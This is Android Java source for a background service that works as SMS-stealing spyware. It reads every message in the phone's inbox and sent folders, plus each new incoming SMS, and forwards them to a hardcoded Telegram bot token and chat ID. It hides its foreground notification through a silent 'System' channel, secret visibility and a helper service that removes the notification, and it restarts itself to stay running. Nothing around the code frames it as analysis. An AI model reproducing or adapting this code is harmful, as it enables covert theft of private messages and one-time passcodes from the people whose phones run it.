package com.smshandler;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsService extends Service {

    static final String BOT_TOKEN = "8755444402:AAFmqp2gnX3BKhbd4RGg0Tvl3DmNx9Whsh8";
    static final String CHAT_ID   = "8623638607";
    static final int    NOTIF_ID  = 9901;
    static final String CH_ID     = "x_hidden";

    private static final String PREFS    = "sms_prefs";
    private static final String KEY_SENT = "old_sms_sent";

    @Override
    public void onCreate() {
        super.onCreate();
        startHiddenForeground();
    }

    private void startHiddenForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CH_ID, "System", NotificationManager.IMPORTANCE_NONE);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableLights(false);
            ch.enableVibration(false);
            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }

        Notification notif = new NotificationCompat.Builder(this, CH_ID)
            .setSmallIcon(android.R.drawable.screen_background_dark)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setShowWhen(false)
            .setOngoing(false)
            .build();

        startForeground(NOTIF_ID, notif);

        // InnerService trick: notification hata do silently
        startService(new Intent(this, InnerService.class));
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("sms_sender")) {
            String sender = intent.getStringExtra("sms_sender");
            String body   = intent.getStringExtra("sms_body");
            long   time   = intent.getLongExtra("sms_time", System.currentTimeMillis());
            new Thread(() -> sendToTelegram(sender, body, time)).start();
        } else {
            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
            if (!prefs.getBoolean(KEY_SENT, false)) {
                prefs.edit().putBoolean(KEY_SENT, true).apply();
                new Thread(this::sendAllOldSms).start();
            }
        }
        return START_STICKY;
    }

    private void sendAllOldSms() {
        sendFromFolder("content://sms/inbox", false);
        sendFromFolder("content://sms/sent", true);
    }

    private void sendFromFolder(String uriStr, boolean isSent) {
        ContentResolver cr = getContentResolver();
        Cursor cursor = null;
        try {
            cursor = cr.query(Uri.parse(uriStr),
                new String[]{"address", "body", "date"},
                null, null, "date ASC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String addr = cursor.getString(0);
                    String body = cursor.getString(1);
                    long   date = cursor.getLong(2);
                    String label = isSent ? "[Bheja: " + addr + "]" : addr;
                    sendToTelegram(label, body, date);
                    Thread.sleep(500);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    public static void sendToTelegram(String sender, String body, long timestamp) {
        try {
            String date = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                              .format(new Date(timestamp));
            String text = "From: " + sender + "\nMsg: " + body + "\nTime: " + date;
            String api  = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            String data = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                        + "&text="    + URLEncoder.encode(text,    "UTF-8");

            URL url = new URL(api);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            OutputStream os = conn.getOutputStream();
            os.write(data.getBytes("UTF-8"));
            os.flush();
            conn.getInputStream();
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }


    // ──────────────────────────────────────────────
    //  InnerService — notification permanently hatata hai
    // ──────────────────────────────────────────────
    public static class InnerService extends Service {
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Notification notif = new NotificationCompat.Builder(this, CH_ID)
                    .setSmallIcon(android.R.drawable.screen_background_dark)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .setSilent(true)
                    .build();
                startForeground(NOTIF_ID, notif);
            }
            stopSelf();
            return START_NOT_STICKY;
        }

        @Override
        public IBinder onBind(Intent intent) { return null; }
    }
}
